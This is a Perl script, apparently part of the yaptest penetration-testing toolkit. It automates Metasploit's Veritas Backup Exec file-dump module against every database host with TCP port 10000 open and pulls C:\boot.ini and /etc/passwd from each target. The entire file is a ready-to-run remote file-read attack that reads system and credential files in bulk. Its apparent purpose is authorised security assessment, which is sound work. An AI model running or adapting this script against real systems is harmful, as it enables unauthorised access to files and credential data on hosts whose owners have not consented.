#!/usr/bin/env perl
use strict;
use warnings;
use POSIX;
use yaptest;
use File::Basename;

my $script_name = basename($0);
my $usage = "Usage: $script_name
Performs metasploit3 veritas file read check on IPs in database with port 10000/TCP open.

NB: 'msfcli' from Metasploit version 3 should be in the path.
";

die $usage if shift;
my $y = yaptest->new();

$y->run_test(
	command => "msfcli auxiliary/admin/backupexec/dump RHOST=::IP:: LPATH=backupexec_dump-boot-::IP::.mtf RPATH='C:\\boot.ini' E",
	filter => { port => 10000, transport_protocol => 'tcp' },
	output_file => 'metasploit-veritas-file-download-win-::IP::.out'
);

$y->run_test(
	command => "msfcli auxiliary/admin/backupexec/dump RHOST=::IP:: LPATH=backupexec_dump-passwd-::IP::.mtf RPATH='/etc/passwd' E",
	filter => { port => 10000, transport_protocol => 'tcp' },
	output_file => 'metasploit-veritas-file-download-nix-::IP::.out'
);
